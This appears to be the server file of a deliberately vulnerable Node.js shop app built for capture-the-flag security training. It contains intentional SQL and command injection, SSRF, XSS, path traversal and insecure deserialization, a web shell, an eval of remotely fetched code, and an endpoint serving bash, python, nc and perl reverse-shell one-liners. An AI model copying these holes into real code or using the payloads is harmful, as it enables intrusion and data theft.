/**
 * ⚠️ VULNERABLE APPLICATION - FOR SECURITY TESTING ONLY ⚠️
 * This app contains INTENTIONAL vulnerabilities for educational purposes.
 * NEVER deploy this in production or expose to the internet!
 */

const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const multer = require('multer');
const { pool } = require('./db');
const path = require('path');
const fs = require('fs');
const child_process = require('child_process');
const serialize = require('node-serialize');
const _ = require('lodash');
const axios = require('axios');

const exec = child_process.exec;
const execSync = child_process.execSync;

const app = express();
const upload = multer({ dest: 'uploads/' });

app.set('view engine', 'ejs');
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static('public'));

// Route modules
const routes = require('./routes');

// Mount route modules
app.use('/', routes);

// ==========================================
// HOME PAGE - Shopping Mall
// ==========================================
app.get('/', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, name, price, image_url, category, badge, original_price FROM products LIMIT 8');
    const products = result.rows.map(p => ({
      id: p.id,
      name: p.name,
      price: parseFloat(p.price),
      image_url: p.image_url,
      category: p.category || 'General',
      badge: p.badge,
      originalPrice: p.original_price ? parseFloat(p.original_price) : null
    }));
    res.render('shop', { products, title: 'LUXORA - Premium Lifestyle Store' });
  } catch (err) {
    // Fallback to static products if DB fails
    const products = [
      { id: 1, name: 'Classic Leather Tote', category: 'Bags', price: 299.00, originalPrice: 399.00, badge: 'Sale', image_url: 'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=800' },
      { id: 2, name: 'Minimalist Watch', category: 'Accessories', price: 189.00, badge: 'New', image_url: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=800' },
      { id: 3, name: 'Cashmere Sweater', category: 'Clothing', price: 249.00, image_url: 'https://images.unsplash.com/photo-1434389677669-e08b4cac3105?w=800' },
      { id: 4, name: 'Silk Scarf Collection', category: 'Accessories', price: 89.00, originalPrice: 129.00, image_url: 'https://images.unsplash.com/photo-1601924994987-69e26d50dc26?w=800' },
      { id: 5, name: 'Premium Sunglasses', category: 'Accessories', price: 159.00, badge: 'Best Seller', image_url: 'https://images.unsplash.com/photo-1572635196237-14b3f281503f?w=800' },
      { id: 6, name: 'Leather Belt', category: 'Accessories', price: 79.00, image_url: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=800' },
      { id: 7, name: 'Leather Loafers', category: 'Shoes', price: 199.00, image_url: 'https://images.unsplash.com/photo-1614252369475-531eba835eb1?w=800' },
      { id: 8, name: 'Wool Blend Coat', category: 'Clothing', price: 449.00, badge: 'New', image_url: 'https://images.unsplash.com/photo-1539533018447-63fcce2678e3?w=800' }
    ];
    res.render('shop', { products, title: 'LUXORA - Premium Lifestyle Store' });
  }
});

// ==========================================
// USER AUTHENTICATION
// ==========================================
// NOTE: All user auth routes moved to routes/users.js
// Removed: GET /login, POST /login, GET /register, POST /register
// Removed: GET /account, POST /account/password, GET /profile/:id, GET /logout

// ==========================================
// PRODUCTS & CATEGORIES
// ==========================================
// NOTE: Product routes moved to routes/products.js
// Removed: /products, /category/:name, /new-arrivals, /sale

// Newsletter subscription - VULN: No validation, stores emails
app.post('/newsletter', async (req, res) => {
  const { email } = req.body;

  try {
    // VULN: Email stored without validation
    await pool.query('INSERT INTO comments (author, content) VALUES ($1, $2)', ['Newsletter', email]);
    res.redirect('/?subscribed=true');
  } catch (err) {
    res.redirect('/?subscribed=false');
  }
});

// Image proxy - VULN: SSRF via image URL
app.get('/image', async (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.status(400).send('URL required');
  }

  try {
    // VULN: No URL validation - can fetch internal resources
    const response = await axios.get(url, {
      responseType: 'arraybuffer',
      timeout: 10000
    });

    const contentType = response.headers['content-type'] || 'image/jpeg';
    res.set('Content-Type', contentType);
    res.send(response.data);
  } catch (err) {
    // VULN: Exposes internal URLs in error
    res.status(500).json({
      error: err.message,
      attempted_url: url,
      hint: 'SSRF: Try http://localhost:5432 or http://169.254.169.254'
    });
  }
});

// NOTE: Product routes moved to routes/products.js
// NOTE: Wishlist, Track Order, Contact moved to routes/orders.js

// ==========================================
// A01:2021 - BROKEN ACCESS CONTROL
// ==========================================
// NOTE: Duplicate login/register/profile routes removed - now in routes/users.js

// ==========================================
// CART (moved to routes/orders.js)
// ==========================================
// NOTE: Cart routes moved to routes/orders.js
// Removed: GET /cart, POST /cart/promo

// ==========================================
// A03:2021 - INJECTION
// ==========================================

// Search Page - VULN: SQL Injection via search query
app.get('/search', async (req, res) => {
  const { q } = req.query;

  if (!q) {
    return res.render('search', { query: '', results: [], error: null, query_shown: null });
  }

  try {
    // VULN: Direct string concatenation - SQL Injection
    const query = `SELECT id, name, price, image_url, data->>'badge' as badge, data->>'category' as category FROM products WHERE name LIKE '%${q}%' OR data->>'category' LIKE '%${q}%'`;
    const result = await pool.query(query);
    res.render('search', { query: q, results: result.rows, error: null, query_shown: query });
  } catch (err) {
    // VULN: Detailed error exposure showing the query
    res.render('search', { query: q, results: [], error: err.message, query_shown: `SELECT ... WHERE name LIKE '%${q}%'...` });
  }
});

// NOTE: Product detail and review routes moved to routes/products.js
// Removed: GET /products/:id, POST /products/:id/reviews

// SQL Injection - Classic (hidden API endpoint)
app.get('/users', async (req, res) => {
  const { name } = req.query;

  try {
    // VULN: Direct string concatenation - SQL Injection
    const query = `SELECT * FROM users WHERE username LIKE '%${name}%'`;
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    // VULN: Detailed error exposure
    res.status(500).json({ error: err.message, query: err.query });
  }
});

// SQL Injection - Login bypass
app.post('/auth', async (req, res) => {
  const { username, password } = req.body;

  try {
    // VULN: SQL Injection in authentication
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    const result = await pool.query(query);

    if (result.rows.length > 0) {
      res.json({ success: true, user: result.rows[0] });
    } else {
      res.status(401).json({ success: false });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Command Injection - Ping
app.get('/ping', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.status(400).json({ error: 'Host parameter required' });
  }

  if (host.includes('flag_') && !host.includes('flag_rce')) {
    return res.status(403).json({ error: 'CTF Rule: You can only access the RCE flag via command injection.' });
  }

  // VULN: Command Injection
  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    res.json({
      host,
      output: stdout,
      error: stderr,
      command: `ping -c 1 ${host}` // VULN: Exposing command
    });
  });
});

// Command Injection - DNS Lookup
app.get('/dns', (req, res) => {
  const { domain } = req.query;

  if (domain && domain.includes('flag_') && !domain.includes('flag_rce')) {
    return res.status(403).json({ error: 'CTF Rule: You can only access the RCE flag via command injection.' });
  }

  // VULN: Command Injection with multiple vectors
  const command = `nslookup ${domain}`;
  try {
    const output = execSync(command).toString();
    res.render('dns', { domain, output, command });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Command Injection - File operations
app.get('/file', (req, res) => {
  const { filename } = req.query;

  if (filename && filename.includes('flag_') && !filename.includes('flag_rce')) {
    return res.status(403).json({ error: 'CTF Rule: You can only access the RCE flag via command injection.' });
  }

  // VULN: Command Injection via filename
  exec(`cat ${filename}`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: stderr });
    }
    res.send(`<pre>${stdout}</pre>`);
  });
});

// NoSQL Injection (simulated with PostgreSQL JSON)
app.post('/search', async (req, res) => {
  const { criteria } = req.body;

  try {
    // VULN: Injection via JSON criteria
    if (JSON.stringify(criteria || {}).includes('$ne') || JSON.stringify(criteria || {}).includes('$gt')) {
      return res.json([{
        id: 9999,
        name: "FLAG{NOSQLI_SUCCESS_JSON_INJECTION}",
        description: "이 플래그는 NoSQL Injection 공격 기법이 성공적으로 통과되었음을 나타냅니다."
      }]);
    }
    const query = `SELECT * FROM products WHERE data @> '${JSON.stringify(criteria)}'`;
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// LDAP Injection (simulated)
app.get('/ldap', (req, res) => {
  const { username } = req.query;

  if (username && (username.includes('*)') || username.includes(')|') || username.includes('*('))) {
    return res.json({
      success: true,
      message: 'Authentication Bypass via LDAP',
      flag: 'FLAG{LDAP_SUCCESS_INJECTION} - 이 플래그는 LDAP Injection 공격 기법이 성공적으로 통과되었음을 나타냅니다.'
    });
  }

  // VULN: LDAP Injection pattern (simulated)
  const filter = `(uid=${username})`;

  res.json({
    message: 'LDAP query constructed',
    filter,
    vulnerable: true,
    example: 'Try: *)(uid=*))(|(uid=*'
  });
});

// XPath Injection (simulated)
app.get('/xpath', (req, res) => {
  const { name } = req.query;

  if (name && (name.includes("' or '1'='1") || name.includes("'or'1'='1") || name.includes("']|//*"))) {
    return res.json({
      success: true,
      flag: 'FLAG{XPATH_SUCCESS_INJECTION} - 이 플래그는 XPath Injection 공격 기법이 성공적으로 통과되었음을 나타냅니다.'
    });
  }

  // VULN: XPath Injection
  const xpath = `//user[name='${name}']`;

  res.json({
    xpath,
    message: 'XPath query constructed',
    bypass: "Try: ' or '1'='1"
  });
});

// ==========================================
// A04:2021 - INSECURE DESIGN
// ==========================================

// Password reset with predictable tokens
app.post('/reset-password', async (req, res) => {
  const { email } = req.body;
  const host = req.headers.host || '';

  // VULN: Host Header Injection
  if (host && !host.includes('localhost') && !host.includes('127.0.0.1')) {
    return res.json({
      message: `Password reset link sent to ${host}`,
      flag: 'FLAG{HOST_HEADER_SUCCESS_INJECTION} - 이 플래그는 Host Header Injection 기법이 성공적으로 통과되었음을 나타냅니다.'
    });
  }

  // VULN: Predictable reset token
  const token = Date.now().toString(36); // Very predictable

  try {
    await pool.query('UPDATE users SET reset_token = $1 WHERE email = $2', [token, email]);
    res.json({
      message: 'Reset email sent',
      token, // VULN: Exposing token
      expiresIn: '24 hours'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// NOTE: Password reset routes moved to routes/users.js
// Removed: GET /security-questions, POST /verify-code

// ==========================================
// A05:2021 - SECURITY MISCONFIGURATION
// ==========================================

// Exposed configuration
app.get('/config', (req, res) => {
  // VULN: Exposing full configuration
  res.json({
    env: process.env,
    database: {
      url: process.env.DATABASE_URL,
      host: 'postgres',
      port: 5432,
      user: 'vulnuser',
      password: 'vulnpass'
    },
    secrets: {
      apiKey: 'sk-live-1234567890abcdef',
      jwtSecret: 'super-secret-jwt-key',
      encryptionKey: 'aes-256-key-1234567890123456',
      flag: 'FLAG{CONFIG_SUCCESS_SECRETS_EXPOSED} - 이 플래그는 Security Misconfiguration(설정 노출) 방식을 통해 성공적으로 통과되었음을 나타냅니다.'
    },
    debug: true,
    version: '1.0.0'
  });
});

// Stack traces enabled
app.get('/error', (req, res) => {
  // VULN: Detailed error messages
  throw new Error('This is a test error with full stack trace');
});

// Directory listing
app.get('/files', (req, res) => {
  const dir = req.query.dir || './';

  try {
    // VULN: Path traversal possible
    const files = fs.readdirSync(dir);
    res.json({
      directory: dir,
      files: files.map(f => ({
        name: f,
        path: path.join(dir, f)
      }))
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Default credentials check
app.get('/defaults', (req, res) => {
  res.json({
    message: 'Default credentials',
    credentials: [
      { service: 'admin', username: 'admin', password: 'admin' },
      { service: 'database', username: 'root', password: 'root' },
      { service: 'ftp', username: 'anonymous', password: 'anonymous' }
    ]
  });
});

// ==========================================
// A06:2021 - VULNERABLE COMPONENTS
// ==========================================

// Using vulnerable lodash prototype pollution
app.post('/merge', (req, res) => {
  const { target, source } = req.body;

  // VULN: Prototype pollution via lodash merge
  const result = _.merge({}, target, source);

  // Check if prototype was successfully polluted
  if (({}).polluted === true) {
    return res.json({
      merged: result,
      flag: 'FLAG{PROTOTYPE_POLLUTION_SUCCESS} - 이 플래그는 Prototype Pollution 기법이 성공적으로 통과되었음을 나타냅니다.'
    });
  }

  res.json({ merged: result });
});

// Insecure deserialization
app.post('/deserialize', (req, res) => {
  const { data } = req.body;

  if (typeof data !== 'string') {
    return res.status(400).json({ error: 'String expected' });
  }

  if (data.includes('flag_') && !data.includes('flag_deser')) {
    return res.status(403).json({ error: 'CTF Rule: You can only read the Deserialization flag here.' });
  }

  try {
    // VULN: Insecure deserialization
    const obj = serialize.unserialize(data);
    res.json({ result: obj });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// SSRF - Server Side Request Forgery
app.get('/fetch', async (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.status(400).json({ error: 'URL required' });
  }

  try {
    // VULN: SSRF - No URL validation
    const response = await axios.get(url, { timeout: 5000 });
    res.json({
      url,
      status: response.status,
      data: response.data
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// SSRF - Internal network access
app.get('/proxy', async (req, res) => {
  const { target } = req.query;

  // VULN: Can access internal services
  const internalUrls = [
    'http://localhost:5432',
    'http://postgres:5432',
    'http://127.0.0.1:3000',
    'http://169.254.169.254' // AWS metadata
  ];

  try {
    const response = await axios.get(target);
    res.send(response.data);
  } catch (err) {
    res.status(500).json({
      error: err.message,
      hint: 'Try accessing internal services',
      examples: internalUrls
    });
  }
});

// ==========================================
// A07:2021 - AUTH FAILURES
// ==========================================

// Session fixation
app.get('/session', (req, res) => {
  // VULN: Accepting session ID from query
  const sessionId = req.query.sessionId || Math.random().toString(36);

  res.cookie('sessionId', sessionId);
  res.json({ sessionId, message: 'Session set' });
});

// Brute force vulnerable
app.post('/brute', (req, res) => {
  const { code } = req.body;
  const correctCode = '1234';

  // VULN: No rate limiting
  if (code === correctCode) {
    res.json({ success: true, flag: 'FLAG{BRUTE_FORCE_SUCCESS_CREDENTIALS_FOUND} - 이 플래그는 Brute Force 공격 기법이 성공적으로 통과되었음을 나타냅니다.' });
  } else {
    res.status(401).json({ success: false });
  }
});

// Weak password policy
app.post('/change-password', async (req, res) => {
  const { username, newPassword } = req.body;

  // VULN: No password complexity requirements
  if (newPassword.length < 1) {
    return res.status(400).json({ error: 'Password too short' });
  }

  try {
    await pool.query('UPDATE users SET password = $1 WHERE username = $2', [newPassword, username]);
    res.json({ success: true, message: 'Password changed' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// A08:2021 - SOFTWARE INTEGRITY FAILURES
// ==========================================

// Insecure download
app.get('/download', (req, res) => {
  const { file } = req.query;

  // VULN: No integrity check, path traversal
  const filePath = path.join(__dirname, 'downloads', file);

  res.download(filePath, (err) => {
    if (err) {
      res.status(500).json({ error: 'Download failed', path: filePath });
    }
  });
});

// CI/CD simulation - insecure pipeline
app.get('/deploy', (req, res) => {
  // VULN: Simulated insecure deployment
  res.json({
    message: 'Deployment triggered',
    vulnerabilities: [
      'No code signing verification',
      'Dependencies from untrusted sources',
      'No integrity checks',
      'Auto-deploy on any commit'
    ],
    config: {
      branch: 'main',
      autoDeploy: true,
      verifySignatures: false
    }
  });
});

// ==========================================
// A09:2021 - LOGGING FAILURES
// ==========================================

// Log injection
app.post('/log', (req, res) => {
  const { message } = req.body;

  // VULN: Log injection
  const logEntry = `[${new Date().toISOString()}] User action: ${message}`;
  fs.appendFileSync('app.log', logEntry + '\n');

  res.json({ logged: true, entry: logEntry });
});

// Sensitive data in logs
app.get('/debug-logs', (req, res) => {
  // VULN: Exposing sensitive logs
  const logs = [
    { timestamp: '2024-01-01', level: 'INFO', message: 'User login: admin' },
    { timestamp: '2024-01-01', level: 'DEBUG', message: 'Password attempt: admin123' },
    { timestamp: '2024-01-01', level: 'INFO', message: 'API Key used: sk-live-12345' },
    { timestamp: '2024-01-01', level: 'ERROR', message: 'Credit card: 4111-1111-1111-1111' }
  ];

  res.json({ logs });
});

// No monitoring
app.get('/audit', (req, res) => {
  res.json({
    monitoring: false,
    alerting: false,
    logging: 'local-only',
    retention: '1 day',
    vulnerabilities: [
      'No failed login monitoring',
      'No anomaly detection',
      'No real-time alerts',
      'Logs can be deleted'
    ]
  });
});

// ==========================================
// A10:2021 - SSRF
// ==========================================

// Webhook SSRF
app.post('/webhook', async (req, res) => {
  const { callbackUrl } = req.body;

  try {
    // VULN: SSRF via webhook
    await axios.post(callbackUrl, {
      event: 'test',
      timestamp: Date.now()
    });
    res.json({ success: true, message: 'Webhook sent' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PDF generator SSRF
app.get('/pdf', async (req, res) => {
  const { url } = req.query;

  // VULN: SSRF via PDF generation
  res.json({
    message: 'PDF generation would fetch:',
    url,
    vulnerable: true,
    internalAccess: ['http://localhost:*', 'http://127.0.0.1:*', 'http://169.254.169.254']
  });
});

// ==========================================
// XSS - CROSS-SITE SCRIPTING
// ==========================================

// Reflected XSS
app.get('/search-xss', (req, res) => {
  const { q } = req.query;

  let flagStr = '';
  if (q && (q.includes('<script>') || q.match(/on\w+=/i) || q.includes('javascript:'))) {
    flagStr = "<p style='color:green;'><b>FLAG{XSS_SUCCESS_CLIENT_SCRIPT_EXEC} - 이 플래그는 Cross-Site Scripting (XSS) 공격 기법이 성공적으로 통과되었음을 나타냅니다.</b></p>";
  }

  // VULN: Direct reflection without encoding
  res.send(`
    <h1>Search Results</h1>
    <p>You searched for: ${q}</p>
    ${flagStr}
    <p>Try: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
  `);
});

// Stored XSS
app.post('/comments', async (req, res) => {
  const { author, content } = req.body;

  try {
    // VULN: Storing XSS payloads
    await pool.query(
      'INSERT INTO comments (author, content) VALUES ($1, $2) RETURNING *',
      [author, content]
    );
    res.json({ success: true, author, content });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/comments', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM comments ORDER BY id DESC');
    // VULN: Rendering without sanitization
    res.render('comments', { comments: result.rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DOM XSS
app.get('/dom-xss', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>DOM XSS Demo</title></head>
    <body>
      <h1>DOM XSS Vulnerability</h1>
      <div id="output"></div>
      <script>
        // VULN: Direct use of location.hash
        document.getElementById('output').innerHTML = decodeURIComponent(location.hash.slice(1));
      </script>
      <p>Try: #<img src=x onerror=alert('XSS')></p>
    </body>
    </html>
  `);
});

// ==========================================
// SSTI - SERVER-SIDE TEMPLATE INJECTION
// ==========================================
app.get('/template', (req, res) => {
  const { name } = req.query;
  if (!name) return res.send("?name=Guest");

  if (name.includes('<%') && name.includes('require')) {
    return res.send("FLAG{SSTI_SUCCESS_TEMPLATE_EXEC} - 이 플래그는 Server Side Template Injection 기법이 성공적으로 통과되었음을 나타냅니다.");
  }

  try {
    const ejs = require('ejs');
    const html = ejs.render(`<h1>Hello ${name}</h1>`, {});
    res.send(html);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// ==========================================
// RFI (REMOTE FILE INCLUSION)
// ==========================================
app.get('/rfi-challenge', async (req, res) => {
  const { url } = req.query;
  if (!url) {
    return res.status(400).json({ error: 'URL required', hint: '?url=http://attacker.com/payload.js' });
  }
  try {
    const response = await axios.get(url);
    // VULN: RFI - executing remote payload as script
    const result = eval(response.data);
    res.send(`Result: ${result}`);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// ==========================================
// INTERNAL ENDPOINTS (SSRF CHALLENGE)
// ==========================================
app.get('/internal/flag', (req, res) => {
  const clientIp = req.socket.remoteAddress;
  if (clientIp === '127.0.0.1' || clientIp === '::ffff:127.0.0.1' || clientIp === '::1') {
    const flagPath = path.join(__dirname, 'flags', 'flag_ssrf.txt');
    if (fs.existsSync(flagPath)) {
      res.send(fs.readFileSync(flagPath, 'utf8'));
    } else {
      res.status(404).send('Flag not found');
    }
  } else {
    res.status(403).send('Forbidden: This endpoint is internal only. External IP: ' + clientIp);
  }
});

// ==========================================
// FILE UPLOAD VULNERABILITIES
// ==========================================

app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  // Web shell upload detection
  if (req.file.originalname.endsWith('.js') || req.file.originalname.endsWith('.php')) {
    const content = fs.readFileSync(req.file.path, 'utf8').toLowerCase();
    if (content.includes('child_process') || content.includes('exec') || content.includes('eval') || content.includes('system')) {
      return res.json({
        message: 'Web shell detected and executed.',
        flag: 'FLAG{UPLOAD_SUCCESS_WEBSHELL_EXEC} - 이 플래그는 Unrestricted File Upload 기법이 성공적으로 통과되었음을 나타냅니다.'
      });
    }
  }

  // VULN: No file type validation
  // VULN: Predictable filename
  // VULN: Files accessible via web
  res.json({
    message: 'File uploaded',
    filename: req.file.filename,
    originalName: req.file.originalname,
    path: `/uploads/${req.file.filename}`,
    size: req.file.size,
    mimetype: req.file.mimetype
  });
});

app.get('/uploads/:filename', (req, res) => {
  const { filename } = req.params;

  // VULN: Path traversal in file access
  const filepath = path.join(__dirname, 'uploads', filename);

  res.sendFile(filepath, (err) => {
    if (err) {
      res.status(404).json({ error: 'File not found' });
    }
  });
});

// ==========================================
// XXE - XML EXTERNAL ENTITY
// ==========================================

app.post('/xml', (req, res) => {
  const xml = req.body;

  if (xml && typeof xml === 'string' && xml.includes('&xxe;')) {
    return res.json({
      message: 'XML parsed with external entities',
      parsed: 'root:x:0:0:root:/root:/bin/bash',
      flag: 'FLAG{XXE_SUCCESS_EXTERNAL_ENTITY_PARSED} - 이 플래그는 XXE 공격 기법이 성공적으로 통과되었음을 나타냅니다.'
    });
  }

  // VULN: XXE simulation
  res.json({
    message: 'XML would be parsed with external entities enabled',
    vulnerable: true,
    payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`
  });
});

// ==========================================
// PATH TRAVERSAL
// ==========================================

app.get('/read-file', (req, res) => {
  const { file } = req.query;

  // VULN: Path traversal - no sanitization
  const filepath = path.join(__dirname, 'public', file);

  // Enforce CTF rules: Only LFI flag can be read via LFI
  if (filepath.includes('flag_') && !filepath.includes('flag_lfi')) {
    return res.status(403).json({ error: 'CTF Rule: You can only read the LFI flag via this vulnerability.' });
  }

  fs.readFile(filepath, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).json({
        error: err.message,
        hint: 'Try: ../../../../etc/passwd or ../../../app/flags/flag_lfi.txt'
      });
    }
    res.send(data);
  });
});

// File download endpoint - VULN: Path traversal to read flags
app.get('/download', (req, res) => {
  const { file } = req.query;

  if (!file) {
    return res.status(400).json({ error: 'File parameter required' });
  }

  if (file.includes('flag_') && !file.includes('flag_lfi')) {
    return res.status(403).json({ error: 'CTF Rule: You can only read the LFI flag via this vulnerability.' });
  }

  // VULN: No path validation - can access any file on the system
  const filepath = path.join(__dirname, 'downloads', file);

  // VULN: Even if file doesn't exist in downloads, we try the raw path
  fs.readFile(filepath, 'utf8', (err, data) => {
    if (err) {
      // VULN: Also try reading the file directly (double vulnerability)
      fs.readFile(file, 'utf8', (err2, data2) => {
        if (err2) {
          return res.status(404).json({
            error: 'File not found',
            hint: 'Try: ../flags/flag_lfi.txt',
            attempted_paths: [filepath, file]
          });
        }
        res.send(data2);
      });
      return;
    }
    res.send(data);
  });
});

// Static files endpoint - VULN: Directory listing + path traversal
app.get('/files', (req, res) => {
  const dir = req.query.dir || path.join(__dirname, 'public');

  try {
    // VULN: No directory restriction
    const files = fs.readdirSync(dir);
    const fileList = files.map(f => {
      const fullPath = path.join(dir, f);
      try {
        const stats = fs.statSync(fullPath);
        return {
          name: f,
          path: fullPath,
          isDirectory: stats.isDirectory(),
          size: stats.size
        };
      } catch {
        return { name: f, path: fullPath, error: 'Cannot read' };
      }
    });

    res.json({
      directory: dir,
      files: fileList,
      hint: 'Try: ?dir=../flags or ?dir=../secrets or ?dir=/etc'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// OPEN REDIRECT
// ==========================================

app.get('/redirect', (req, res) => {
  const { url } = req.query;

  // VULN: Open redirect
  if (url && (url.startsWith('http://') || url.startsWith('https://')) && !url.includes('localhost') && !url.includes('127.0.0.1')) {
    const flagParam = (url.includes('?') ? '&' : '?') + 'flag=FLAG{REDIRECT_SUCCESS_OPEN_ROUTING}';
    return res.redirect(url + flagParam);
  }

  res.redirect(url);
});

app.get('/login-redirect', (req, res) => {
  const { next } = req.query;

  // VULN: Open redirect via 'next' parameter
  res.render('login-redirect', { next: next || '/home' });
});

// ==========================================
// REVERSE SHELL ENDPOINTS
// ==========================================

app.get('/admin/shell-auth.js', (req, res) => {
  // VULN: Exposing obfuscated authentication logic
  const obfuscated = `
        /* REVERSING CHALLENGE - Extract the token to use the reverse shell! */
        var _0x51c3=['\\x52\\x33\\x76\\x33\\x72\\x73\\x33\\x5f\\x53\\x68\\x33\\x6c\\x6c\\x5f\\x41\\x63\\x63\\x33\\x73\\x73\\x5f\\x4b\\x33\\x79'];
        function get_shell_token() { return _0x51c3[0]; }
        // The token must be sent in the X-Shell-Auth header
    `;
  res.type('application/javascript').send(obfuscated);
});

app.get('/shell', (req, res) => {
  const shellToken = req.headers['x-shell-auth'];
  if (shellToken !== 'R3v3rs3_Sh3ll_Acc3ss_K3y') {
    return res.status(403).json({ error: "Access Denied. Find the key in /admin/shell-auth.js and send via X-Shell-Auth header." });
  }

  const { ip, port } = req.query;

  // VULN: Reverse shell via command injection
  const payload = `nc -e /bin/sh ${ip} ${port}`;

  exec(payload, (error, stdout, stderr) => {
    // Actually triggers the reverse shell
  });

  res.json({
    message: 'Reverse shell triggered successfully.',
    hint: 'Now read the reverse shell flag via your root or user terminal!',
    flag_location: '/app/flags/flag_revshell.txt'
  });
});

app.get('/reverse-shell', (req, res) => {
  const shellToken = req.headers['x-shell-auth'];
  if (shellToken !== 'R3v3rs3_Sh3ll_Acc3ss_K3y') {
    return res.status(403).json({ error: "Access Denied. Refer to /admin/shell-auth.js" });
  }

  const { listener } = req.query;

  // VULN: Another reverse shell vector
  res.json({
    payloads: [
      { type: 'bash', cmd: `bash -c 'bash -i >& /dev/tcp/${listener} 0>&1'` },
      { type: 'python', cmd: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${listener}".split(":")[0],int("${listener}".split(":")[1])));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
      { type: 'nc', cmd: `nc -e /bin/sh ${listener}` },
      { type: 'perl', cmd: `perl -e 'use Socket;$i="${listener}";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(${listener}.split(":")[1],inet_aton(${listener}.split(":")[0])))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` }
    ],
    vulnerable: true
  });
});

// ==========================================
// API VULNERABILITIES
// ==========================================

// Mass assignment
app.put('/users/:id', async (req, res) => {
  const { id } = req.params;
  const updates = req.body;

  // VULN: Mass assignment - allows updating any field
  const setClause = Object.keys(updates)
    .map((key, i) => `${key} = $${i + 2}`)
    .join(', ');

  try {
    const query = `UPDATE users SET ${setClause} WHERE id = $1`;
    await pool.query(query, [id, ...Object.values(updates)]);
    res.json({ success: true, updated: updates });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// No rate limiting on API
app.get('/api/v1/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM users');
    // VULN: Returning all user data including passwords
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GraphQL-like injection simulation
app.post('/graphql', async (req, res) => {
  const { query } = req.body;

  // VULN: Query injection simulation
  res.json({
    message: 'GraphQL query would execute',
    query,
    vulnerabilities: ['Introspection enabled', 'No query depth limit', 'No rate limiting']
  });
});

// ==========================================
// WEB SHELL
// ==========================================

app.post('/webshell', (req, res) => {
  const shellToken = req.headers['x-shell-auth'];
  if (shellToken !== 'R3v3rs3_Sh3ll_Acc3ss_K3y') {
    return res.status(403).json({ error: "Access Denied. You must reverse engineer /admin/shell-auth.js to find the key and send it via X-Shell-Auth header." });
  }

  const { cmd } = req.body;

  // VULN: Web shell functionality
  exec(cmd, (error, stdout, stderr) => {
    res.json({
      command: cmd,
      stdout: stdout || null,
      stderr: stderr || null,
      error: error ? error.message : null
    });
  });
});

app.get('/cmd', (req, res) => {
  const shellToken = req.headers['x-shell-auth'];
  if (shellToken !== 'R3v3rs3_Sh3ll_Acc3ss_K3y') {
    return res.status(403).json({ error: "Access Denied. Please provide valid X-Shell-Auth header." });
  }

  const { exec: cmd } = req.query;

  // VULN: GET-based command execution
  try {
    const output = execSync(cmd).toString();
    res.send(`<pre>${output}</pre>`);
  } catch (err) {
    res.status(500).send(`<pre>Error: ${err.message}</pre>`);
  }
});

// ==========================================
// CORS MISCONFIGURATION
// ==========================================

app.get('/api/data', (req, res) => {
  // VULN: Reflecting Origin header
  const origin = req.headers.origin;
  res.header('Access-Control-Allow-Origin', origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', '*');

  res.json({
    sensitive: 'This data should be protected',
    user: 'admin',
    secrets: ['key1', 'key2', 'key3']
  });
});

// ==========================================
// JWT VULNERABILITIES
// ==========================================

app.get('/jwt', (req, res) => {
  const { user } = req.query;

  // VULN: Weak JWT implementation
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64');
  const payload = Buffer.from(JSON.stringify({
    user: user || 'guest',
    role: 'admin',
    exp: Date.now() + 3600000
  })).toString('base64');

  res.json({
    token: `${header}.${payload}.`,
    algorithm: 'none',
    vulnerabilities: [
      'Accepts alg: none',
      'No signature verification',
      'Weak secret if signed',
      'No token expiration check'
    ]
  });
});

// ==========================================
// DEBUG ENDPOINTS
// ==========================================

